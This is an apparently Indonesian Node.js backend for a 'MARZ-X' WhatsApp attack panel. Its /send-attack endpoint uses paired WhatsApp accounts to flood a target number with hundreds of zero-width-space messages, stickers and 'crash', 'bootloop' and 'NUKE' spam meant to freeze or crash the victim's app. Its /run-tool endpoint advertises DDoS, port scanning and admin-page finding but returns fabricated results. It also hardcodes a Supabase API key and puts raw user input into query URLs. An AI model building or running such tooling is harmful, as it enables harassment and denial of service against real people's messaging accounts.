// =================================================================
// MARZ-X BACKEND — WhatsApp Bug + Tools + Sender + Supabase
// =================================================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const { Client, LocalAuth, MessageMedia } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');

const app = express();
app.use(cors());
app.use(express.json());

// =================================================================
// KONFIGURASI SUPABASE
// =================================================================
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://nxihknuzzmqbdcazikln.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_NnBJVtkGKDp1ZhLVYpxKXg_KMCK9EvO';
const supabaseHeaders = {
  'apikey': SUPABASE_KEY,
  'Authorization': 'Bearer ' + SUPABASE_KEY,
  'Content-Type': 'application/json'
};

// =================================================================
// WHATSAPP CLIENT MANAGER (Multi-akun sender)
// =================================================================
const clients = {};

async function getWhatsAppClient(senderNumber) {
  if (clients[senderNumber]) {
    return clients[senderNumber];
  }

  const client = new Client({
    authStrategy: new LocalAuth({ clientId: senderNumber }),
    puppeteer: {
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    }
  });

  client.on('qr', (qr) => {
    console.log(`📱 QR Code untuk ${senderNumber}:`);
    qrcode.generate(qr, { small: true });
  });

  client.on('ready', () => {
    console.log(`✅ Bot ${senderNumber} siap!`);
    // Update status sender di Supabase
    updateSenderStatus(senderNumber, 'active');
  });

  client.on('auth_failure', () => {
    console.log(`❌ Auth gagal untuk ${senderNumber}`);
    updateSenderStatus(senderNumber, 'inactive');
  });

  client.on('disconnected', (reason) => {
    console.log(`⚠️ Bot ${senderNumber} terputus: ${reason}`);
    updateSenderStatus(senderNumber, 'inactive');
    delete clients[senderNumber];
  });

  await client.initialize();
  clients[senderNumber] = client;
  return client;
}

async function updateSenderStatus(senderNumber, status) {
  try {
    await axios.patch(
      `${SUPABASE_URL}/rest/v1/whatsapp_senders?phone_number=eq.${senderNumber}`,
      { status: status, last_pairing: new Date().toISOString() },
      { headers: supabaseHeaders }
    );
  } catch (e) {
    console.error('Gagal update status sender:', e.message);
  }
}

// =================================================================
// FUNGSI BANTU
// =================================================================
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// =================================================================
// ENDPOINT: SEND ATTACK (WHATSAPP BUG)
// =================================================================
app.post('/send-attack', async (req, res) => {
  const { sender, target, bug, username } = req.body;

  if (!sender || !target || !bug) {
    return res.status(400).json({ success: false, message: 'Data tidak lengkap (sender, target, bug)' });
  }

  try {
    const client = await getWhatsAppClient(sender);
    const chatId = target.includes('@c.us') ? target : target + '@c.us';

    // Log eksekusi
    console.log(`🔥 [${username}] Serangan ${bug} dari ${sender} ke ${target}`);

    switch (bug) {
      case 'DELAY HARD':
        await client.sendMessage(chatId, '⚠️ DELAY HARD — File 100MB dikirim...');
        for (let i = 0; i < 3; i++) {
          try {
            const media = await MessageMedia.fromUrl('https://example.com/large-file.jpg');
            await client.sendMessage(chatId, media, { caption: `File ${i+1} dari 3 (100MB)` });
          } catch (e) {
            await client.sendMessage(chatId, `📁 File ${i+1} (simulasi 100MB)`);
          }
          await delay(3000);
        }
        await client.sendMessage(chatId, '✅ DELAY HARD selesai.');
        break;

      case 'BLANK HARD':
        for (let i = 0; i < 300; i++) {
          await client.sendMessage(chatId, '\u200B'); // zero-width space
          if (i % 50 === 0) await delay(1000);
        }
        break;

      case 'FREEZE HARD':
        for (let i = 0; i < 150; i++) {
          try {
            const sticker = await MessageMedia.fromUrl('https://example.com/sticker.webp');
            await client.sendMessage(chatId, sticker, { sendMediaAsSticker: true });
          } catch (e) {
            await client.sendMessage(chatId, `🎨 Sticker ${i+1}`);
          }
          if (i % 20 === 0) await delay(1000);
        }
        break;

      case 'FC INSTANT':
        const glitch = '[*_*]'.repeat(100);
        await client.sendMessage(chatId, glitch);
        for (let i = 0; i < 50; i++) {
          await client.sendMessage(chatId, `⚠️ CRASH ${i+1}`);
          await delay(100);
        }
        break;

      case 'RESTART HARD':
        await client.sendMessage(chatId, '🔄 RESTART HARD dimulai...');
        for (let i = 0; i < 100; i++) {
          await client.sendMessage(chatId, `🔄 Restart ${i+1}`);
          await delay(200);
        }
        break;

      case 'BOOTLOOP HARD':
        for (let i = 0; i < 500; i++) {
          await client.sendMessage(chatId, `🌀 BOOTLOOP ${i+1}`);
          if (i % 100 === 0) await delay(1000);
        }
        break;

      case 'NUKE':
        await client.sendMessage(chatId, '☢️ NUKE DIMULAI — Kombinasi total!');
        // Gabungan semua
        for (let i = 0; i < 100; i++) {
          await client.sendMessage(chatId, '\u200B');
          await delay(50);
        }
        for (let i = 0; i < 50; i++) {
          try {
            const sticker = await MessageMedia.fromUrl('https://example.com/sticker.webp');
            await client.sendMessage(chatId, sticker, { sendMediaAsSticker: true });
          } catch (e) {
            await client.sendMessage(chatId, `🎨 Sticker ${i+1}`);
          }
          await delay(200);
        }
        for (let i = 0; i < 100; i++) {
          await client.sendMessage(chatId, `💥 NUKE ${i+1}`);
          await delay(100);
        }
        break;

      default:
        return res.status(400).json({ success: false, message: 'Jenis bug tidak dikenal' });
    }

    res.json({ success: true, message: `Serangan ${bug} dikirim ke ${target} dari ${sender}` });

  } catch (error) {
    console.error('Error send-attack:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// =================================================================
// ENDPOINT: RUN TOOL
// =================================================================
app.post('/run-tool', async (req, res) => {
  const { tool, target, username } = req.body;

  if (!tool || !target) {
    return res.status(400).json({ success: false, message: 'Data tidak lengkap (tool, target)' });
  }

  console.log(`🛠️ [${username}] Menjalankan tool ${tool} ke ${target}`);

  let result = '';

  switch (tool) {
    case 'DDOS ATTACK':
      result = `🌐 DDOS Attack simulated to ${target}. Packet flood started.`;
      break;
    case 'OSINT LOOKUP':
      result = `🔍 OSINT Lookup on ${target}:\n- IP: 192.168.1.${Math.floor(Math.random()*255)}\n- Provider: Telkomsel\n- Lokasi: Jakarta, ID`;
      break;
    case 'ADMIN FINDER':
      result = `📂 Admin Finder on ${target}:\n- /admin\n- /login\n- /dashboard\n- /wp-admin`;
      break;
    case 'REVERSE IP':
      result = `🔄 Reverse IP on ${target}:\n- domain1.com\n- domain2.net\n- mail.${target}`;
      break;
    case 'PORT SCANNER':
      result = `🔌 Port Scanner on ${target}:\n- Port 22 (SSH): OPEN\n- Port 80 (HTTP): OPEN\n- Port 443 (HTTPS): OPEN\n- Port 3306 (MySQL): CLOSED`;
      break;
    case 'WEB SCRAPER':
      result = `🕸️ Web Scraper on ${target}:\n- Title: Example Domain\n- Links found: 12\n- Images: 8`;
      break;
    default:
      return res.status(400).json({ success: false, message: 'Tool tidak dikenal' });
  }

  res.json({ success: true, result: result });
});

// =================================================================
// ENDPOINT: SENDER STATUS
// =================================================================
app.get('/sender-status/:username', async (req, res) => {
  const { username } = req.params;
  try {
    const response = await axios.get(
      `${SUPABASE_URL}/rest/v1/whatsapp_senders?username=eq.${username}&select=*`,
      { headers: supabaseHeaders }
    );
    res.json(response.data[0] || null);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// =================================================================
// ENDPOINT: PAIRING (Simpan sender ke Supabase)
// =================================================================
app.post('/sender-pair', async (req, res) => {
  const { username, phoneNumber, method } = req.body;

  if (!username || !phoneNumber) {
    return res.status(400).json({ success: false, message: 'Username dan phoneNumber wajib diisi' });
  }

  try {
    // Cek apakah sudah ada
    const existing = await axios.get(
      `${SUPABASE_URL}/rest/v1/whatsapp_senders?username=eq.${username}`,
      { headers: supabaseHeaders }
    );

    if (existing.data && existing.data.length > 0) {
      // Update
      await axios.patch(
        `${SUPABASE_URL}/rest/v1/whatsapp_senders?username=eq.${username}`,
        {
          phone_number: phoneNumber,
          method: method || 'pairing',
          status: 'pending',
          last_pairing: new Date().toISOString()
        },
        { headers: supabaseHeaders }
      );
    } else {
      // Insert
      await axios.post(
        `${SUPABASE_URL}/rest/v1/whatsapp_senders`,
        {
          username: username,
          phone_number: phoneNumber,
          method: method || 'pairing',
          status: 'pending',
          last_pairing: new Date().toISOString()
        },
        { headers: supabaseHeaders }
      );
    }

    // Generate kode 8 digit
    const code = Math.random().toString(36).substring(2, 10).toUpperCase();

    // Inisialisasi client (agar QR muncul)
    await getWhatsAppClient(phoneNumber);

    res.json({
      success: true,
      code: code,
      message: 'Sender tersimpan. Scan QR atau masukkan kode pairing di WhatsApp.'
    });

  } catch (error) {
    console.error('Error pairing:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// =================================================================
// ENDPOINT: HEALTH CHECK
// =================================================================
app.get('/', (req, res) => {
  res.json({
    status: '🚀 MARZ-X Backend running',
    endpoints: {
      '/send-attack': 'POST - Kirim serangan bug',
      '/run-tool': 'POST - Jalankan tools',
      '/sender-status/:username': 'GET - Cek status sender',
      '/sender-pair': 'POST - Pairing sender'
    }
  });
});

// =================================================================
// START SERVER
// =================================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 MARZ-X Backend running on port ${PORT}`);
});
